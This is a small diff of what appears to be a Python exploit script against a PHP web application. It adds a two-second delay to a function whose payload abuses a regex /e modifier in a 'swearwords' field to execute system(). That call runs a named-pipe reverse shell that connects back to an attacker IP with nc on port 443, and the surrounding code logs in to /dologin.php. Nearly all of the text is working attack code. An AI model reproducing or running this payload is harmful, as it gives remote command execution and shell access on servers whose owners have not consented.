@@ -30,6 +30,7 @@ def login():
     session.post(target + '/dologin.php', data=creds, verify=False)
 
 def cmd():
+    time.sleep(2)
     data = {
         "swearwords[/fuck/e]": f"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 443 >/tmp/f');",
         "swearwords[/shit/i]": "poop",
